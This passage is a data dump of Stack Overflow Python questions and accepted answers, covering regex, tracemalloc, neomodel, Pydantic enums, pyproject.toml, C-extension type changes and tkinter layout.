 4  Machine02-2022-01-28_00-21-45.blf.428
</code></pre>
<p>I want my column to look like this</p>
<pre><code>      filename
 0    2022-01-28 00-21-45 424
 1    2022-01-28 00-21-45 425
 2    2022-01-28 00-21-45 426
 3    2022-01-28 00-21-45 427
 4    2022-01-28 00-21-45 428
</code></pre>
<p>I tried this code</p>
<pre><code>df['filename'] = df['filename'].str.extract(r&quot;(\d{4}-\d{1,2}-\d{1,2})_(\d{2}-\d{2}-\d{2}).*\.(\d+)&quot;, r&quot;\1 \2 \3&quot;)
</code></pre>
<p>I am getting this error, unsupported operand type(s) for &amp;: 'str' and 'int'.<br />
Can anyone please tell me where I am doing wrong ?</p>
","71583643","<p>please try this:</p>
<pre><code>df['filename'] = df['filename'].str.split('-',1).apply(lambda x:' '.join(x[1].split('_')).replace('.blf.',' '))
</code></pre>
"
"71452013","1","Does Python not reuse memory here? What does tracemalloc's output mean?","<p>I create a list of a million <code>int</code> objects, then replace each with its negated value. <code>tracemalloc</code> reports 28 MB extra memory (28 bytes per new <code>int</code> object). Why? Does Python not reuse the memory of the garbage-collected <code>int</code> objects for the new ones? Or am I misinterpreting the <code>tracemalloc</code> results? Why does it say those numbers, what do they really mean here?</p>
<pre><code>import tracemalloc

xs = list(range(10**6))
tracemalloc.start()
for i, x in enumerate(xs):
    xs[i] = -x
print(tracemalloc.get_traced_memory())
</code></pre>
<p>Output (<a href=""https://tio.run/##TYzLCsJADADv@Yocs0VFEUQEv0SkLDXWwL7IRth@/Vo8dW4Dw5TFPjmdr0V7l1iyGpr6iaMPIU8AreIdg1Qj9WlmOh2H4eIcbKJDNa9GDt5ZUXbYUBJy@kZWb0ytuhvgSqsPea63fYOikoy2j5lt/PtrjByzLuRc7z8"" rel=""noreferrer"" title=""Python 3.8 (pre-release) – Try It Online"">Try it online!</a>):</p>
<pre><code>(27999860, 27999972)
</code></pre>
<p>If I replace <code>xs[i] = -x</code> with <code>x = -x</code> (so the new object rather than the original object gets garbage-collected), the output is a mere <code>(56, 196)</code> (<a href=""https://tio.run/##TYzLCsJADEX3@Yosk6KiCCKC31KGGuvAvMhEmH79tHTVuztwzi2L/XK6P4v27mPJamjqJokuhDwBtIpvDL4aqUuz0O06DA9mOEiXak6NGL5Z0Z@woU8o6R9FnQm1yi/AbW17Ojco6pPRsZ/Fxp0/Y5SYdSHm3lc"" rel=""noreferrer"" title=""Python 3.8 (pre-release) – Try It Online"">try it</a>). How does it make any difference which of the two objects I keep/lose?</p>
<p>And if I do the loop twice, it still only reports <code>(27992860, 27999972)</code> (<a href=""https://tio.run/##lY3LCsJADEX38xVZJkVFEUQEv6RIGWqsgc6DTITp14/FVbee3YXDPXmxd4rna9bWJOSkBqZ@5ODnOY3O1QJ3mKUYqo8T4@nYdRcit5EOxbwaknslBdlBBYnA8RNYvTHWQjcHK7X08ljf9vUPM6tEw21tYht@@zkEDkkXJGrtCw"" rel=""noreferrer"" title=""Python 3.8 (pre-release) – Try It Online"">try it</a>). Why not 56 MB? How is the second run any different for this than the first?</p>
","71481334","<h2>Short Answer</h2>
<p>tracemalloc was started too late to track the inital block of memory, so it
didn't realize it was a reuse. In the example you gave, you free 27999860 bytes
and allocate 27999860 bytes, but tracemalloc can't 'see' the free. Consider the
following, slightly modified example:</p>
<pre><code>import tracemalloc

tracemalloc.start()

xs = list(range(10**6))
print(tracemalloc.get_traced_memory())
for i, x in enumerate(xs):
    xs[i] = -x
print(tracemalloc.get_traced_memory())
</code></pre>
<p>On my machine (python 3.10, but same allocator), this displays:</p>
<pre><code>(35993436, 35993436)
(36000576, 36000716)
</code></pre>
<p>After we allocate xs, the system has allocated 35993436 bytes, and after we run
the loop we have a net total of 36000576. This shows that the memory usage isn't
actually increasing by 28 Mb.</p>
<h2>Why does it behave this way?</h2>
<p>Tracemalloc works by overriding the standard internal methods for allocating
with <code>tracemalloc_alloc</code>, and the similar free and realloc methods. Taking a
peek at the <a href=""https://github.com/python/cpython/blob/2cf7f865f099db11cc6903b334d9c376610313e8/Modules/_tracemalloc.c#L583-L607"" rel=""noreferrer"">source</a>:</p>
<pre><code>static void*
tracemalloc_alloc(int use_calloc, void *ctx, size_t nelem, size_t elsize)
{
    PyMemAllocatorEx *alloc = (PyMemAllocatorEx *)ctx;
    void *ptr;

    assert(elsize == 0 || nelem &lt;= SIZE_MAX / elsize);

    if (use_calloc)
        ptr = alloc-&gt;calloc(alloc-&gt;ctx, nelem, elsize);
    else
        ptr = alloc-&gt;malloc(alloc-&gt;ctx, nelem * elsize);
    if (ptr == NULL)
        return NULL;

    TABLES_LOCK();
    if (ADD_TRACE(ptr, nelem * elsize) &lt; 0) {
        /* Failed to allocate a trace for the new memory block */
        TABLES_UNLOCK();
        alloc-&gt;free(alloc-&gt;ctx, ptr);
        return NULL;
    }
    TABLES_UNLOCK();
    return ptr;
}
</code></pre>
<p>We see that the new allocator does two things:</p>
<p>1.) Call out to the &quot;old&quot; allocator to get memory</p>
<p>2.) Add a trace to a special table, so we can track this memory</p>
<p>If we look at the associated free functions, it's very similar:</p>
<p>1.) free the memory</p>
<p>2.) Remove the trace from the table</p>
<p>In your example, you allocated xs before you called <code>tracemalloc.start()</code>, so
the trace records for this allocation are never put in the memory tracking
table. Therefore, when you call free on the initial array data, the traces aren't removed, and thus your weird allocation behavior.</p>
<h2>Why is the total memory usage 36000000 bytes and not 28000000</h2>
<p>Lists in python are weird. They're actually a list of pointer to individually
allocated objects. Internally, they look like this:</p>
<pre><code>typedef struct {
    PyObject_HEAD
    Py_ssize_t ob_size;

    /* Vector of pointers to list elements.  list[0] is ob_item[0], etc. */
    PyObject **ob_item;

    /* ob_item contains space for 'allocated' elements.  The number
     * currently in use is ob_size.
     * Invariants:
     *     0 &lt;= ob_size &lt;= allocated
     *     len(list) == ob_size
     *     ob_item == NULL implies ob_size == allocated == 0
     */
    Py_ssize_t allocated;
} PyListObject;
</code></pre>
<p>PyObject_HEAD is a macro that expands to some header information all python
variables have. It is just 16 bytes, and contains pointers to type data.</p>
<p>Importantly, a list of integers is actually a list of pointer to PyObjects
that happen to be ints. On the line <code>xs = list(range(10**6))</code>, we expect to
allocate:</p>
<ul>
<li>1 PyListObject with internal size 1000000 -- true size:</li>
</ul>
<pre><code>sizeof(PyObject_HEAD) + sizeof(PyObject *) * 1000000 + sizeof(Py_ssize_t)
(     16 bytes      ) + (    8 bytes     ) * 1000000 + (     8 bytes    )
8000024 bytes
</code></pre>
<ul>
<li>1000000 PyObject ints (A <code>PyLongObject</code> in the underlying implmentation)</li>
</ul>
<pre><code>1000000 * sizeof(PyLongObject)
1000000 * (     28 bytes     )
28000000 bytes
</code></pre>
<p>For a grand total of 36000024 bytes. That number looks pretty farmiliar!</p>
<p>When you overwrite a value in the array, your just freeing the old value, and updating the pointer in PyListObject-&gt;ob_item. This means the array structure is allocated once, takes up 8000024 bytes, and lives to the end of the program. Additionally, 1000000 Integer objects are each allocated, and references are put in the array. They take up the 28000000 bytes. One by one, they are deallocated, and then the memory is used to reallocate a new object in the loop. This is why multiple loops don't increase the amount of memory.</p>
"
"71290699","1","Is it possible to connect to AuraDB with neomodel?","<p>Is it possible to connect to AuraDB with <code>neomodel</code>?</p>
<p>AuraDB connection URI is like <code>neo4j+s://xxxx.databases.neo4j.io</code>.<br />
This is not contained user/password information.</p>
<p>However, connection config of neomodel is bolt and it is contained user/password information.<br />
<code>config.DATABASE_URL = 'bolt://neo4j:password@localhost:7687'</code></p>
","71311469","<p>Connecting to neo4j Aura uses neo4j+s protocol so you need to use the provided uri by Aura.</p>
<p>Reference: <a href=""https://neo4j.com/developer/python/#driver-configuration"" rel=""noreferrer"">https://neo4j.com/developer/python/#driver-configuration</a></p>
<p>In example below; you can set the database url by setting the userid and password along with the uri. It works for me so it should also work for you.</p>
<pre><code>from neomodel import config

user = 'neo4j'
psw = 'awesome_password'
uri = 'awesome.databases.neo4j.io'
    
config.DATABASE_URL = 'neo4j+s://{}:{}@{}'.format(user, psw, uri)
print(config.DATABASE_URL)

Result: 

   neo4j+s://neo4j:awesome_password@awesome.databases.neo4j.io
</code></pre>
"
"71669583","1","Is there a converse to `operator.contains`?","<p>edit: I changed the title from <code>complement</code> to <code>converse</code> after the discussion below.</p>
<p>In the <a href=""https://docs.python.org/3/library/operator.html"" rel=""nofollow noreferrer""><strong><code>operator</code></strong></a> module, the binary functions comparing objects take two parameters. But the <code>contains</code> function has them swapped.</p>
<p>I use a list of operators, e.g. <code>operator.lt</code>, <code>operator.ge</code>.</p>
<p>They take 2 arguments, <code>a</code> and <code>b</code>.</p>
<p>I can say <code>operator.lt(a, b)</code> and it will tell me whether <code>a</code> is less than <code>b</code>.</p>
<p>But with <code>operator.contains</code>, I want to know whether <code>b</code> contains <code>a</code> so I have to swap the arguments.</p>
<p>This is a pain because I want a uniform interface, so I can have a user defined list of operations to use (I'm implementing something like Django QL).</p>
<p>I know I could create a helper function which swaps the arguments:</p>
<pre><code>def is_contained_by(a, b):
    return operator.contains(b, a)
</code></pre>
<p>Is there a &quot;standard&quot; way to do it?</p>
<p>Alternatively, I can implement everything backwards, except <code>contains</code>. So map <code>lt</code> to <code>ge</code>, etc, but that gets really confusing.</p>
","71669777","<p>If either of them posts an answer, you should accept that, but between users @chepner and @khelwood, they gave you most of the answer.</p>
<p>The complement of <code>operator.contains</code> would be something like <code>operator.does_not_contain</code>, so that's not what you're looking for exactly. Although I think a 'reflection' isn't quite what you're after either, since that would essentially be its inverse, if it were defined.</p>
<p>At any rate, as @chepner points out, <code>contains</code> is not backwards. It just not the same as <code>in</code>, <code>in</code> would be <code>is_contained_by</code> as you defined it.</p>
<p>Consider that <code>a in b</code> would not be <code>a contains b</code>, but rather <code>b contains a</code>, so the signature of <code>operator.contains</code> makes sense. It follows the convention of the function's stated infix operation being its name. I.e. <code>(a &lt; b) == operator.lt(a, b)</code> and <code>b contains a == operator.contains(b, a) == (a in b)</code>. (in a world where <code>contains</code> would be an existing infix operator)</p>
<p>Although I wouldn't recommend it, because it may cause confusion with others reading your code and making the wrong assumptions, you could do something like:</p>
<pre><code>operator.in_ = lambda a, b: b.__contains__(a)
# or
operator.in_ = lambda a, b: operator.contains(b, a)
</code></pre>
<p>That would give you an <code>operator.in_</code> that works as you expect (and avoids the <code>in</code> keyword), but at the cost of a little overhead and possible confusion. I'd recommend working with <code>operator.contains</code> instead.</p>
"
"71486255","1","How can I make Python re work like grep for repeating groups?","<p>I have the following string:</p>
<pre><code>seq = 'MNRYLNRQRLYNMYRNKYRGVMEPMSRMTMDFQGRYMDSQGRMVDPRYYDHYGRMHDYDRYYGRSMFNQGHSMDSQRYGGWMDNPERYMDMSGYQMDMQGRWMDAQGRYNNPFSQMWHSRQGH'
</code></pre>
<p>also saved in a file called <code>seq.dat</code>. If I use the following <code>grep</code> command</p>
<pre><code>grep '\([MF]D.\{4,6\}\)\{3,10\}' seq.dat
</code></pre>
<p>I get the following matching string:</p>
<pre><code>MDNPERYMDMSGYQMDMQGRWMDAQGRYN
</code></pre>
<p>which is what I want. In words, what I want to match is as many consecutive repeats as the string has of <code>[MF]D.{4,6}</code>. I don't want to match cases where it has less than 3 consecutive repeats, but I want it to be able to capture up to 6.</p>
<p>Now, I'm trying to do this with python. I have</p>
<pre><code>p = re.compile(&quot;(?:[MF]D.{4,6}){3,10}&quot;)
</code></pre>
<p>Trying <code>search()</code> returns</p>
<pre><code>MDNPERYMDMSGYQMDMQGRWM
</code></pre>
<p>It is the close to the answer I seek, but is still missing the last <code>MDAQGRYN</code>. I'm guessing this is because <code>.{4,6}</code> matches the <code>M</code>, which in turn prevents <code>{3,10}</code> from capturing this 4th occurence of <code>([MF]D.{4,6})</code>, but since I asked for at least 3, it's happy and it stops.</p>
<p>How do I make Python regex behave like grep does?</p>
","71487029","<p>There is a fundamental difference between POSIX (&quot;text-directed&quot;) and NFA (&quot;regex-directed&quot;) engines. POSIX engines (<code>grep</code> here uses a POSIX BRE regex flavor, it is the flavor used by default) will parse the input text applying the regex to it and return the longest match possible. NFA engine (Python <code>re</code> engine is an NFA engine) here does not re-consume (backtrack) when the subsequent pattern parts match.</p>
<p>See <a href=""https://www.regular-expressions.info/engine.html"" rel=""nofollow noreferrer""><em>reference on regex-directed and text-directed engines</em></a>:</p>
<blockquote>
<p>A regex-directed engine walks through the regex, attempting to match the next token in the regex to the next character. If a match is found, the engine advances through the regex and the subject string. If a token fails to match, the engine backtracks to a previous position in the regex and the subject string where it can try a different path through the regex... Modern regex flavors using regex-directed engines have lots of features such as atomic grouping and possessive quantifiers that allow you to control this backtracking.</p>
<p>A text-directed engine walks through the subject string, attempting all permutations of the regex before advancing to the next character in the string. A text-directed engine never backtracks. Thus, there isn’t much to discuss about the matching process of a text-directed engine. In most cases, a text-directed engine finds the same matches as a regex-directed engine.</p>
</blockquote>
<p>The last sentence says &quot;in most cases&quot;, but not all cases, and yours is a good illustration that discrepances may occur.</p>
<p>To avoid consuming <code>M</code> or <code>F</code> that are immediately followed with <code>D</code>, I'd suggest using</p>
<pre class=""lang-none prettyprint-override""><code>(?:[MF]D(?:(?![MF]D).){4,6}){3,10}
</code></pre>
<p>See the <a href=""https://regex101.com/r/rewexi/1"" rel=""nofollow noreferrer"">regex demo</a>. <em>Details</em>:</p>
<ul>
<li><code>(?:</code> - start of an outer non-capturing container group:
<ul>
<li><code>[MF]D</code> - <code>M</code> or <code>F</code> and then <code>D</code></li>
<li><code>(?:(?![MF]D).){4,6}</code> - any char (other than a line break) repeated four to six times, that does not start an <code>MD</code> or <code>FD</code> char sequence</li>
</ul>
</li>
<li><code>){3,10}</code> - end of the outer group, repeat 3 to 10 times.</li>
</ul>
<p>By the way, if you only want to match uppercase ASCII letters, replace the <code>.</code> with <code>[A-Z]</code>.</p>
"
"71690992","1","Cannot install latest version of Numpy (1.22.3)","<p>I am trying to install the latest version of numpy, the 1.22.3, but it looks like pip is not able to find this last release.</p>
<p>I know I can install it locally from the source code, but I want to understand why I cannot install it using pip.</p>
<p>PS: I have the latest version of pip, the 22.0.4</p>
<pre><code>ERROR: Could not find a version that satisfies the requirement numpy==1.22.3 (from versions: 1.3.0, 1.4.1, 1.5.0, 1.5.1, 1.6.0, 1.6.1, 1.6.2, 1.7.0, 1.7.1, 1.7.2, 1.8.0, 1.8.1, 1.8.2, 1.9.0, 1.9.1, 1.9.2, 1.9.3, 1.10.0.post2, 1.10.1, 1.10.2, 1.10.4, 1.11.0, 1.11.1, 1.11.2, 1.11.3, 1.12.0, 1.12.1, 1.13.0rc1, 1.13.0rc2, 1.13.0, 1.13.1, 1.13.3, 1.14.0rc1, 1.14.0, 1.14.1, 1.14.2, 1.14.3, 1.14.4, 1.14.5, 1.14.6, 1.15.0rc1, 1.15.0rc2, 1.15.0, 1.15.1, 1.15.2, 1.15.3, 1.15.4, 1.16.0rc1, 1.16.0rc2, 1.16.0, 1.16.1, 1.16.2, 1.16.3, 1.16.4, 1.16.5, 1.16.6, 1.17.0rc1, 1.17.0rc2, 1.17.0, 1.17.1, 1.17.2, 1.17.3, 1.17.4, 1.17.5, 1.18.0rc1, 1.18.0, 1.18.1, 1.18.2, 1.18.3, 1.18.4, 1.18.5, 1.19.0rc1, 1.19.0rc2, 1.19.0, 1.19.1, 1.19.2, 1.19.3, 1.19.4, 1.19.5, 1.20.0rc1, 1.20.0rc2, 1.20.0, 1.20.1, 1.20.2, 1.20.3, 1.21.0rc1, 1.21.0rc2, 1.21.0, 1.21.1, 1.21.2, 1.21.3, 1.21.4, 1.21.5)
ERROR: No matching distribution found for numpy==1.22.3
</code></pre>
","71691188","<p>Please check your Python version. Support for Python 3.7 is dropped since Numpy 1.22.0 release. <a href=""https://github.com/numpy/numpy/releases/tag/v1.22.0"" rel=""noreferrer"">[source]</a></p>
"
"71178416","1","Can you safely change a Python object's type in a C extension?","<h2>Question</h2>
<p>Suppose that I have implemented two Python types using the C extension API and that the types are identical (same data layouts/C <code>struct</code>) with the exception of their names and a few methods. Assuming that all methods respect the data layout, can you safely change the type of an object from one of these types into the other in a C function?</p>
<p>Notably, as of Python 3.9, there appears to be a function <a href=""https://docs.python.org/3/c-api/structures.html#c.Py_SET_TYPE"" rel=""nofollow noreferrer""><code>Py_SET_TYPE</code></a>, but the documentation is not clear as to whether/when this is safe to do. I'm interested in knowing both how to use this function safely and whether types can be safely changed prior to version 3.9.</p>
<h2>Motivation</h2>
<p>I'm writing a Python C extension to implement a Persistent <a href=""https://en.wikipedia.org/wiki/Hash_array_mapped_trie"" rel=""nofollow noreferrer"">Hash Array Mapped Trie</a> (PHAMT); in case it's useful, the source code is <a href=""https://github.com/noahbenson/phamt"" rel=""nofollow noreferrer"">here</a> (as of writing, it is at <a href=""https://github.com/noahbenson/phamt/tree/186a7bde90a7420f414a6b7f7b5e2cf8bcdac201"" rel=""nofollow noreferrer"">this commit</a>). A feature I would like to add is the ability to create a Transient Hash Array Mapped Trie (THAMT) from a PHAMT. THAMTs can be created from PHAMTs in <code>O(1)</code> time and can be mutated in-place efficiently. <strong>Critically, THAMTs have the exact same underlying <a href=""https://github.com/noahbenson/phamt/blob/186a7bde90a7420f414a6b7f7b5e2cf8bcdac201/phamt/phamt.c#L354-L365"" rel=""nofollow noreferrer"">C data-structure</a> as PHAMTs—the only real difference between a PHAMT and a THAMT is a few methods encapsulated by their Python types.</strong> This common structure allows one to very efficiently turn a THAMT back into a PHAMT once one has finished performing a set of edits. (This pattern typically reduces the number of memory allocations when performing a large number of updates to a PHAMT).</p>
<p>A very convenient way to implement the conversion from THAMT to PHAMT would be to simply change the type pointers of the THAMT objects from the THAMT type to the PHAMT type. I am confident that I can write code that safely navigates this change, but I can imagine that doing so might, for example, break the Python garbage collector.</p>
<p>(To be clear: the motivation is just context as to how the question arose. I'm not looking for help implementing the structures described in the <strong>Motivation</strong>, I'm looking for an answer to the <strong>Question</strong>, above.)</p>
","71316603","<h3>The supported way</h3>
<p>It <em>is</em> officially possible to change an object's type in Python, as long as the memory layouts are compatible... but this is mostly limited to types <em>not</em> implemented in C. With some restrictions, it is possible to do</p>
<pre><code># Python attribute assignment, not C struct member assignment
obj.__class__ = some_new_class
</code></pre>
<p>to change an object's class, with one of the restrictions being that both the old and new classes must be &quot;heap types&quot;, which all classes implemented in Python are and most classes implemented in C are not. (<code>types.ModuleType</code> and subclasses of that type are also specifically permitted, despite <code>types.ModuleType</code> not being a heap type. See the <a href=""https://github.com/python/cpython/blob/v3.10.2/Objects/typeobject.c#L4697"" rel=""noreferrer"">source</a> for exact restrictions.)</p>
<p>If you want to create a heap type from C, <a href=""https://docs.python.org/3/c-api/typeobj.html#heap-types"" rel=""noreferrer"">you can</a>, but the interface is pretty different from the normal way of defining Python types from C. Plus, for <code>__class__</code> assignment to work, you have to not set the <code>Py_TPFLAGS_IMMUTABLETYPE</code> flag, and that means that people will be able to monkey-patch your classes in ways you might not like (or maybe you see that as an upside).</p>
<p>If you want to go that route, I suggest looking at the <a href=""https://github.com/python/cpython/blob/v3.10.2/Modules/_functoolsmodule.c"" rel=""noreferrer"">CPython 3.10 <code>_functools</code> module source code</a> for an example. (They set the <code>Py_TPFLAGS_IMMUTABLETYPE</code> flag, which you'll have to make sure not to do.)</p>
<hr />
<h3>The unsupported way</h3>
<p>There was an attempt at one point to allow <code>__class__</code> assignment for non-heap types, as long as the memory layouts worked. It got abandoned because it caused problems with some built-in immutable types, where the interpreter likes to reuse instances. For example, allowing <code>(1).__class__ = SomethingElse</code> would have caused a lot of problems. You can read more in the <a href=""https://github.com/python/cpython/blob/v3.10.2/Objects/typeobject.c#L4720"" rel=""noreferrer"">big comment</a> in the source code for the <code>__class__</code> setter. (The comment is slightly out of date, particularly regarding the <code>Py_TPFLAGS_IMMUTABLETYPE</code> flag, which was added after the comment was written.)</p>
<p>As far as I know, this was the only problem, and I don't think any more problems have been added since then. The interpreter isn't going to aggressively reuse instances of your classes, so as long as <em>you're</em> not doing anything like that, and the memory layouts are compatible, I think changing the type of your objects <em>should</em> work for now, even for non-heap-types. However, it is not officially supported, so even if I'm right about this working for now, there's no guarantee it'll keep working.</p>
<p><code>Py_SET_TYPE</code> only sets an object's type pointer. It doesn't do any refcount fixing that might be needed. It's a very low-level operation. If neither the old class nor the new class are heap types, no extra refcount fixing is needed, but if the old class is a heap type, you will have to decref the old class, and if the new class is a heap type, you will have to incref the new class.</p>
<p>If you need to decref the old class, make sure to do it <em>after</em> changing the object's class and possibly incref'ing the new class.</p>
"
"72071447","1","Python Enum and Pydantic : accept enum member's composition","<p>I have an enum :</p>
<pre class=""lang-py prettyprint-override""><code>from enum import Enum

class MyEnum(Enum):
    val1 = &quot;val1&quot;
    val2 = &quot;val2&quot;
    val3 = &quot;val3&quot;
</code></pre>
<p>I would like to validate a pydantic field based on that enum.</p>
<pre class=""lang-py prettyprint-override""><code>from pydantic import BaseModel

class MyModel(BaseModel):
    my_enum_field: MyEnum
</code></pre>
<p>BUT I would like this validation to also accept string that are composed by the Enum members.</p>
<p>So for example : &quot;val1_val2_val3&quot; or &quot;val1_val3&quot; are valid input.</p>
<p>I cannot make this field as a string field with a validator since I use a test library (<a href=""https://hypothesis.readthedocs.io/en/latest/"" rel=""noreferrer"">hypothesis</a> and <a href=""https://github.com/Goldziher/pydantic-factories"" rel=""noreferrer"">pydantic-factories</a>) that needs this type in order to render one of the values from the enum (for mocking random inputs)</p>
<p>So this :</p>
<pre class=""lang-py prettyprint-override""><code>from pydantic import BaseModel, validator

class MyModel(BaseModel):
    my_enum_field: str

    @validator('my_enum_field', pre=True)
    def validate_my_enum_field(cls, value):
        split_val = str(value).split('_')
        if not all(v in MyEnum._value2member_map_ for v in split_val):
            raise ValueError()
        return value
</code></pre>
<p>Could work, but break my test suites because the field is anymore of enum types.</p>
<p>How to keep this field as an Enum type (to make my mock structures still valid) and make pydantic accept composite values in the same time ?</p>
<p>So far, I tried to dynamically extend the enum, with no success.</p>
","72072103","<p>I looked at this a bit further, and I believe something like this could be helpful. You can create a new class to define the property that is a list of enum values.</p>
<p>This class can supply a customized <code>validate</code> method and supply a <code>__modify_schema__</code> to keep the information present about being a string in the json schema.</p>
<p>We can define a base class for generic lists of concatenated enums like this:</p>
<pre><code>from typing import Generic, TypeVar, Type
from enum import Enum

T = TypeVar(&quot;T&quot;, bound=Enum)


class ConcatenatedEnum(Generic[T], list[T]):
    enum_type: Type[T]

    @classmethod
    def __get_validators__(cls):
        yield cls.validate

    @classmethod
    def validate(cls, value: str):
        return list(map(cls.enum_type, value.split(&quot;_&quot;)))

    @classmethod
    def __modify_schema__(cls, field_schema: dict):
        all_values = ', '.join(f&quot;'{ex.value}'&quot; for ex in cls.enum_type)
        field_schema.update(
            title=f&quot;Concatenation of {cls.enum_type.__name__} values&quot;,
            description=f&quot;Underscore delimited list of values {all_values}&quot;,
            type=&quot;string&quot;,
        )
        if &quot;items&quot; in field_schema:
            del field_schema[&quot;items&quot;]
</code></pre>
<p>In the <code>__modify_schema__</code> method I also provide a way to generate a description of which values are valid.</p>
<p>To use this in your application:</p>
<pre><code>class MyEnum(Enum):
    val1 = &quot;val1&quot;
    val2 = &quot;val2&quot;
    val3 = &quot;val3&quot;


class MyEnumList(ConcatenatedEnum[MyEnum]):
    enum_type = MyEnum


class MyModel(BaseModel):
    my_enum_field: MyEnumList
</code></pre>
<p>Examples Models:</p>
<pre><code>print(MyModel.parse_obj({&quot;my_enum_field&quot;: &quot;val1&quot;}))
print(MyModel.parse_obj({&quot;my_enum_field&quot;: &quot;val1_val2&quot;}))
</code></pre>
<pre><code>my_enum_field=[&lt;MyEnum.val1: 'val1'&gt;]
my_enum_field=[&lt;MyEnum.val1: 'val1'&gt;, &lt;MyEnum.val2: 'val2'&gt;]
</code></pre>
<p>Example Schema:</p>
<pre><code>print(json.dumps(MyModel.schema(), indent=2))
</code></pre>
<pre><code>{
  &quot;title&quot;: &quot;MyModel&quot;,
  &quot;type&quot;: &quot;object&quot;,
  &quot;properties&quot;: {
    &quot;my_enum_field&quot;: {
      &quot;title&quot;: &quot;Concatenation of MyEnum values&quot;,
      &quot;description&quot;: &quot;Underscore delimited list of values 'val1', 'val2', 'val3'&quot;,
      &quot;type&quot;: &quot;string&quot;
    }
  },
  &quot;required&quot;: [
    &quot;my_enum_field&quot;
  ]
}
</code></pre>
"
"71193095","1","Questions on pyproject.toml vs setup.py","<p>Reading up on pyproject.toml, python -m pip install, poetry, flit, etc - I have several questions regarding replacing setup.py with pyproject.toml.</p>
<p>My biggest question was - how does a toml file replace a setup.py. Meaning, a toml file can't do everything a py file can. Reading into it, poetry and flit completely replace setup.py with pyproject.toml. While pip uses the pyproject.toml to specify the build tools, but then still uses the setup.py for everything else.</p>
<p>A good example is, pip currently doesn't have a way to do entry points for console script directly in a toml file, but poetry and flit do.</p>
<ul>
<li><a href=""https://flit.readthedocs.io/en/latest/pyproject_toml.html#scripts-section"" rel=""noreferrer"">https://flit.readthedocs.io/en/latest/pyproject_toml.html#scripts-section</a></li>
<li><a href=""https://python-poetry.org/docs/pyproject/#scripts"" rel=""noreferrer"">https://python-poetry.org/docs/pyproject/#scripts</a></li>
</ul>
<p>My main question right now is;</p>
<p>The point of pyproject.toml is to provide build system requirement. It is a metadata file. So wouldn't the ideal solution to be to use this file only to specify the build system requirements and still leverage the setup.py for everything else.</p>
<p>I am confused because I feel like we're losing a lot to over come a fairly simple problem. By entirely doing way with the setup.py and replacing it with pyproject.toml, we lose a lot of helpful things we can do in a setup.py. We can't use a <code>__version.py__</code>, and we lose the ability to automatically create a universal wheel and sdist and upload our packages to PyPi using Twine. which we can currently do in the setup.py file.</p>
<p>I'm just having a had time wrapping my head around why we would want to completely replace the setup.py with a metadata only file. It seems like using them together is the best of both worlds. We solve the chicken and the egg build system issue, and we get to retain a lot of useful things the setup.py can do.</p>
<p>Wouldn't we need a setup.py to install in Dev mode anyway? Or maybe that is just a pip problem?</p>
","71717788","<p>Currently I am investigating this feature too. I found this <a href=""https://setuptools.pypa.io/en/latest/userguide/pyproject_config.html"" rel=""nofollow noreferrer"">experimental feature</a> explanation of setuptools which should just refer to the <code>pyproject.toml</code> without any need of <code>setup.py</code> in the end.</p>
<p>Regarding <code>dynamic</code> behavior of <code>setup.py</code>, I figured out that you can set a dynamic behavior for fields under the <code>[project]</code> metadata</p>
<pre class=""lang-ini prettyprint-override""><code>dynamic = [&quot;version&quot;]

[tool.setuptools.dynamic]
version = {attr = &quot;my_package.__version__&quot;}
</code></pre>
<p>whereat the corresponding version in this example is set in, e.g. <code>my_package.__init__.py</code></p>
<pre><code>__version__ = &quot;0.1.0&quot;

__all__ = [&quot;__version__&quot;]
</code></pre>
<p>In the end, I guess that setuptools will cover the missing <code>setup.py</code> execution and places the necessary egg-links for the development mode.</p>
"
"71292505","1","TK python checkbutton RTL","<p>I have a checkbutton:</p>
<pre class=""lang-py prettyprint-override""><code>from tkinter import *
master = Tk()
Checkbutton(master, text=&quot;Here...&quot;).grid(row=0, sticky=W)
mainloop()
</code></pre>
<p>Which looks like this:</p>
<p><a href=""https://i.stack.imgur.com/dWDbj.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/dWDbj.png"" alt=""enter image description here"" /></a></p>
<p>I tried to move the checkbutton to the other side (to support RTL languages), so it'll be like:</p>
<p><code>Here...[]</code></p>
<p>I know that I can draw a label next to the checkbutton, but this way clicking the text won't effect the checkbutton.</p>
<p>How can I do it?</p>
","71348390","<p>You can <a href=""https://stackoverflow.com/questions/11504571/clickable-tkinter-labels"">bind the left mouse button click event of the label</a>, to a lambda construct that <a href=""https://dafarry.github.io/tkinterbook/checkbutton.htm#Tkinter.Checkbutton.toggle-method"" rel=""nofollow noreferrer"">toggles</a> the checkbutton -:</p>
<pre><code>label.bind(&quot;&lt;Button-1&gt;&quot;, lambda x : check_button.toggle())
</code></pre>
<p>The label can then be placed before the checkbutton using grid(as mentioned in the OP at the end) -:</p>
<pre><code>from tkinter import *

master = Tk()

l1 = Label(master, text = &quot;Here...&quot;)
cb = Checkbutton(master)
l1.grid(row = 0, column = 0)
cb.grid(row = 0, column = 1, sticky=W)

l1.bind(&quot;&lt;Button-1&gt;&quot;, lambda x : cb.toggle())
mainloop()
</code></pre>
<p>This will toggle, the checkbutton even if the label is clicked.</p>
<p><strong>OUTPUT</strong> -:</p>
<p><a href=""https://i.stack.imgur.com/NlTM0.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/NlTM0.png"" alt=""OUTPUT"" /></a></p>
<hr />
<p><strong>NOTE:</strong></p>
<p>The checkbutton, has to now be fetched as an object(<code>cb</code>), to be used in the lambda construct for the label's bind function callback argument. Thus, it is gridded in the next line. It is generally a good practice to manage the geometry separately, which can prevent error such as <a href=""https://stackoverflow.com/questions/1101750/tkinter-attributeerror-nonetype-object-has-no-attribute-attribute-name"">this</a> one.</p>
<hr />
<p>Also, as mentioned in the <a href=""https://stackoverflow.com/questions/24745824/change-position-of-checkbox-relative-to-text-in-tkinters-checkbutton"">post</a> linked by <a href=""https://stackoverflow.com/users/3500157/alexander-b"">@Alexander B.</a> in the comments, if this assembly is to be used multiple times, it can also be made into a class of it's own that inherits from the <code>tkinter.Frame</code> class -:</p>
<pre><code>class LabeledCheckbutton(Frame):
    def __init__(self, root, text = &quot;&quot;):
        Frame.__init__(self, root)
        self.checkbutton = Checkbutton(self)
        self.label = Label(self, text = text)
        self.label.grid(row = 0, column = 0)
        self.checkbutton.grid(row = 0, column = 1)
        self.label.bind('&lt;Button-1&gt;', lambda x : self.checkbutton.toggle())
        return
    
    pass
</code></pre>
<p>Using this with grid as the geometry manager, would make the full code look like this -:</p>
<pre><code>from tkinter import *

class LabeledCheckbutton(Frame):
    def __init__(self, root, text = &quot;&quot;):
